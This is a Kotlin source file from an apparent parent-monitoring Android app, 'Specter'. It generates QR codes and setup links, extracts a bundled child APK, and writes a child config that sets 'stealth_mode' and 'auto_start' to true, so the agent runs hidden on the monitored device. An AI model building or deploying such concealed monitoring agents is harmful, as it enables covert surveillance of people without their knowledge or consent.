package com.divine.specter.parent.generator

import android.content.Context
import android.graphics.Bitmap
import android.graphics.Color
import com.google.zxing.BarcodeFormat
import com.google.zxing.qrcode.QRCodeWriter
import java.io.File

/**
 * Generates child APK or QR code for easy setup.
 *
 * Two methods to deploy child agent:
 * 1. QR Code - Child scans to get server URL, then downloads APK
 * 2. Pre-configured APK - Bakes server URL into APK (requires APK modification)
 */
class ChildApkGenerator(private val context: Context) {

    /**
     * Generates QR code containing server URL for child setup.
     * Child scans → gets URL → connects to parent server.
     */
    fun generateSetupQrCode(serverUrl: String, deviceName: String): Bitmap {
        val config = "specter://$serverUrl?name=$deviceName"

        val writer = QRCodeWriter()
        val bitMatrix = writer.encode(config, BarcodeFormat.QR_CODE, 512, 512)

        val width = bitMatrix.width
        val height = bitMatrix.height
        val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.RGB_565)

        for (x in 0 until width) {
            for (y in 0 until height) {
                bitmap.setPixel(x, y, if (bitMatrix[x, y]) Color.BLACK else Color.WHITE)
            }
        }

        return bitmap
    }

    /**
     * Gets the child APK from assets (pre-bundled).
     * Returns path to extracted APK.
     */
    fun extractChildApk(): File {
        val outputFile = File(context.cacheDir, "specter-child.apk")

        context.assets.open("specter-child.apk").use { input ->
            outputFile.outputStream().use { output ->
                input.copyTo(output)
            }
        }

        return outputFile
    }

    /**
     * Generates a config file that child can download.
     * Child APK reads this on first run.
     */
    fun generateConfigJson(serverUrl: String, deviceName: String): String {
        return """
        {
            "server_url": "$serverUrl",
            "device_name": "$deviceName",
            "auto_start": true,
            "stealth_mode": true
        }
        """.trimIndent()
    }

    /**
     * Creates a shareable setup link.
     * Format: specter://setup?server=URL&name=NAME
     */
    fun generateSetupLink(serverUrl: String, deviceName: String): String {
        val encodedUrl = java.net.URLEncoder.encode(serverUrl, "UTF-8")
        val encodedName = java.net.URLEncoder.encode(deviceName, "UTF-8")
        return "specter://setup?server=$encodedUrl&name=$encodedName"
    }

    companion object {
        /**
         * Parse setup link into components.
         */
        fun parseSetupLink(link: String): Pair<String, String>? {
            if (!link.startsWith("specter://setup?")) return null

            val params = link.substringAfter("?").split("&").associate {
                val (key, value) = it.split("=")
                key to java.net.URLDecoder.decode(value, "UTF-8")
            }

            val server = params["server"] ?: return null
            val name = params["name"] ?: "Child Device"

            return server to name
        }
    }
}
